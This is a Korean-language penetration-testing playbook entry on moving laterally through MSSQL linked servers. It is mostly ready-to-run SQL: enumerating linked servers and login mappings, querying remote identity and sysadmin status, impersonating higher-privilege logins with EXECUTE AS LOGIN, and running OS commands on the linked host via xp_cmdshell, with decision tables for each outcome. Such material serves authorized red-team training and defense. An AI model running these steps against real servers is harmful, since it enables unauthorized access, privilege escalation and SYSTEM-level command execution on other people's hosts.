---
tags:
  - 서비스/mssql
시작조건: ["명령 실행 호스트에서 <SQL_SERVER>:1433 MSSQL 인증 성공", "현재 SQL login으로 linked server 목록 조회 가능"]
필요권한: ["현재 SQL login의 linked server query 권한", "impersonation 사용 시 해당 login에 대한 IMPERSONATE 권한", "OS 명령 실행은 원격 mapped login의 sysadmin 또는 xp_cmdshell 실행 권한"]
필요조건: ["유효한 MSSQL 계정", "linked server 이름·data source·login mapping", "data access 또는 RPC/RPC Out 설정", "선택적으로 IMPERSONATE 가능한 login"]
결과: ["현재 SQL 세션에서 linked server로의 원격 query 접근", "원격 mapped login과 DB 권한 확인", "권한이 허용할 때 linked server 실제 OS 호스트에서 명령 실행"]
---

# MSSQL Linked Server 내부 이동

## 한 줄 판단

명령 실행 호스트에서 `<SQL_SERVER>:1433`에 인증한 SQL login이 linked server query를 실행할 수 있으면, 현재 SQL 세션에서 `<LINKED_SERVER>`로 query를 전달해 원격 mapped login·DB 권한을 확인하고 sysadmin·xp_cmdshell 권한이 있을 때만 실제 linked server OS 호스트의 원격 명령 실행으로 확장한다.

## 사용할 때

- 현재 보유 접근: 도구를 실행하는 호스트에서 `<SQL_SERVER>:1433` MSSQL에 로그인해 query를 실행할 수 있고 linked server 구성이 보인다.
- 현재 계정·권한: 현재 SQL login, `EXECUTE AS LOGIN` 후 impersonated login, linked server에서 사용되는 remote mapped login을 서로 다른 주체로 본다.
- 도달해야 하는 대상: 공격 호스트가 linked server에 직접 도달할 필요는 없지만, `<SQL_SERVER>` DB 엔진이 linked server data source와 query·RPC를 주고받을 수 있어야 한다.
- 지금 가능한 행동: `sys.servers`·login mapping을 조회하고 원격 `@@SERVERNAME`·`SYSTEM_USER`·`IS_SRVROLEMEMBER`를 확인한다. 현재 login으로 실패하면 IMPERSONATE 권한이 있는 login으로 mapping 변화를 재검증한다.
- 성공 범위: 원격 query 응답은 linked DB 접근, `sysadmin = 1`은 원격 SQL sysadmin, `hostname & whoami`의 원격 출력은 해당 OS 호스트에서의 명령 실행을 의미한다. SQL 인증 성공만으로 OS 명령 실행·SYSTEM 권한을 추정하지 않는다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 명령 실행 위치와 네트워크 경로 | 클라이언트 호스트→`<SQL_SERVER>:1433`, DB 엔진→linked server data source 경로 | `impacket-mssqlclient`·`sqlcmd`·`sqsh` query 응답과 `EXECUTE ... AT` 결과 | 1433 경로, linked server data source·RPC Out·data access 확인 |
| 현재 계정 또는 인증 수단 | 현재 SQL login과 선택적 impersonated login | `SYSTEM_USER`, `EXECUTE AS LOGIN`, `REVERT` | 현재 login의 IMPERSONATE 권한과 대상 login 확인 |
| 현재 권한 | linked server 조회·query 및 필요 시 impersonation 권한 | `sys.servers`, `sp_helplinkedsrvlogin`, 원격 `IS_SRVROLEMEMBER` | mapping·data access·RPC Out·원격 역할 확인 |
| 공격 대상의 조건 | linked server에 원격 query가 도달하고 remote login이 mapping됨 | 원격 `@@SERVERNAME`, `SYSTEM_USER`, `IS_SRVROLEMEMBER` | `untrusted domain`·RPC 오류면 self mapping, Windows 신뢰, 저장된 SQL login 확인 |
| 필요한 파일·목록·주소 | `<SQL_SERVER>`, `<LINKED_SERVER>`, 선택적 `<IMPERSONATE_TARGET>` | `sys.servers`와 login mapping의 이름·data source 대조 | 실제 linked server 이름과 실행 컨텍스트 수정 |

## 실행

### 선택 기준
| 단서 | 의미 | 다음 행동 |
|---|---|---|
| linked server 존재 | DB 간 이동 경로 | 원격 query 가능성 확인 |
| 원격 sysadmin | 원격 SQL 권한 상승 가능 | xp_cmdshell, 파일 접근 확인 |
| 원격 서버명/계정 다름 | 다른 자산 접근 | 데이터 수집과 영향 범위 분리 |
| impersonate 후 원격 login 변경 | linked server mapping 우회 가능성 | 원격 sysadmin 여부 확인 |
| 원격 서버명이 현재 서버와 같음 | 동일 호스트로 돌아오는 linked server일 수 있음 | `hostname`, `whoami`로 OS 실행 위치 확인 |

### 절차
1. 현재 서버에서 linked server 목록을 확인한다.
2. 연결된 서버에 원격 query가 가능한지 검증한다.
3. 원격 서버의 사용자 컨텍스트와 sysadmin 여부를 확인한다.
4. 원격 권한에 따라 데이터 수집, xp_cmdshell, 추가 linked server를 분기한다.
5. 현재 login으로 실패하면 impersonate 가능한 login으로 컨텍스트를 바꿔 linked query를 재시도한다.

### linked server 확인

```sql
SELECT srvname, isremote FROM sysservers;
SELECT name, product, provider, data_source, is_linked, is_data_access_enabled, is_rpc_out_enabled FROM sys.servers;
EXEC sp_helplinkedsrvlogin @rmtsrvname = '<LINKED_SERVER>';
```

확인할 출력:

- linked server 이름과 원격 SQL 인스턴스 단서.
- 특정 local login에만 매핑되는지, 모든 local login에 적용되는지 확인한다.
- `self` 또는 현재 보안 컨텍스트로 연결되면 Windows Integrated Authentication 위임/신뢰 문제로 `untrusted domain`이 발생할 수 있다.
- remote login이 별도로 지정되어 있으면 저장된 SQL/원격 login 매핑으로 권한이 달라질 수 있다.

### 원격 query와 권한 확인

```sql
EXECUTE('SELECT CAST(@@SERVERNAME AS varchar(40)) AS server, CAST(SYSTEM_USER AS varchar(40)) AS login, IS_SRVROLEMEMBER(''sysadmin'') AS sysadmin') AT [<LINKED_SERVER>];
```

확인할 출력:

- 원격 SQL 서버명.
- 원격 연결 계정.
- 원격 sysadmin 여부.

### impersonation 컨텍스트로 linked server 재시도

```sql
USE master;
EXECUTE AS LOGIN = '<IMPERSONATE_TARGET>';
SELECT SYSTEM_USER;
EXECUTE('SELECT CAST(@@SERVERNAME AS varchar(40)) AS server, CAST(SYSTEM_USER AS varchar(40)) AS login, IS_SRVROLEMEMBER(''sysadmin'') AS sysadmin') AT [<LINKED_SERVER>];
REVERT;
```

확인할 출력:

- 현재 login으로는 실패해도 impersonated login에서는 linked server mapping이 달라질 수 있다.
- 원격 `login`이 `testadmin` 같은 고권한 login이고 `sysadmin = 1`이면 [[MSSQL xp_cmdshell 명령 실행]]으로 이어간다.

### linked server에서 OS 명령 실행 위치 확인

```sql
USE master;
EXECUTE AS LOGIN = '<IMPERSONATE_TARGET>';
EXECUTE('EXEC xp_cmdshell ''hostname & whoami'';') AT [<LINKED_SERVER>];
REVERT;
```

확인할 출력:

- `hostname`으로 실제 OS 명령 실행 대상이 목표 서버인지 확인한다.
- `whoami`가 `nt authority\system`이면 해당 호스트에서 SYSTEM 명령 실행에 성공한 것이다.

### 원격 서버에서 데이터베이스 확인

```sql
EXECUTE('select name from master.dbo.sysdatabases') AT [<LINKED_SERVER>];
```

확인할 출력:

- 원격 서버에서 접근 가능한 DB 목록.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `sys.servers`에 linked server와 mapping이 보임 | DB 간 연결 경로가 구성됨 | linked server 후보 | 원격 query와 실행 컨텍스트 확인 |
| 원격 query가 서버명·login·`sysadmin` 값을 반환함 | linked server 접근 성공 | 원격 DB 접근 | 원격 DB와 권한 범위 열거 |
| impersonation 뒤 원격 login이 바뀌고 `sysadmin = 1` | login mapping으로 원격 권한이 확장됨 | 원격 sysadmin 권한 | [[MSSQL xp_cmdshell 명령 실행]] 검토 |
| 원격 `hostname`이 다른 호스트이고 `whoami`가 고권한 서비스 계정 또는 SYSTEM | 다른 자산에서 OS 명령이 실행됨 | 원격 OS 명령 실행 | 해당 호스트의 identity와 영향 범위 재평가 |
| 원격 서버명이 현재 서버와 같음 | linked server가 동일 호스트로 돌아올 수 있음 | 동일 호스트 DB 권한 확장 | `hostname`, `whoami`로 실제 실행 위치 확정 |
| linked server가 없음 | 구성된 DB 이동 경로가 없음 | 현재 DB 접근만 유지 | [[DB 인증과 데이터 열거]]로 전환 |
| query가 RPC 오류 또는 `untrusted domain`으로 실패함 | 옵션·권한·Windows 신뢰 또는 mapping 문제 | linked server 경로 미확보 | RPC Out, SQL login mapping, impersonate 후보 확인 |
| query는 되지만 sysadmin이 아님 | 원격 접근은 있으나 관리자 권한은 없음 | 제한된 원격 DB 접근 | 원격 DB·테이블·자격 증명 수집 |

## 확인할 출력과 권한

| 확인 지점 | 확인할 출력 | 권한 판단 |
|---|---|---|
| 연결 정의 | server name, data source, RPC Out, login mapping | 단순 목록과 실제 query 가능성을 구분 |
| 원격 identity | 원격 `@@SERVERNAME`, `SYSTEM_USER` | 현재 DB login과 원격 mapped login을 분리 |
| 원격 역할 | `IS_SRVROLEMEMBER('sysadmin')` | 원격 sysadmin 여부를 반환값으로 확정 |
| OS 실행 위치 | `hostname`, `whoami` | 동일 호스트·원격 호스트와 서비스 계정·SYSTEM을 분리 |

## 후속 공격 연결

- [[DB 인증과 데이터 열거]]
- [[MSSQL Impersonation 권한 상승]]
- [[MSSQL xp_cmdshell 명령 실행]]

## 관련 서비스

- [[MSSQL 서비스]]

## 관련 도구

- [[impacket-mssqlclient]]
- [[sqlcmd]]
- [[sqsh]]
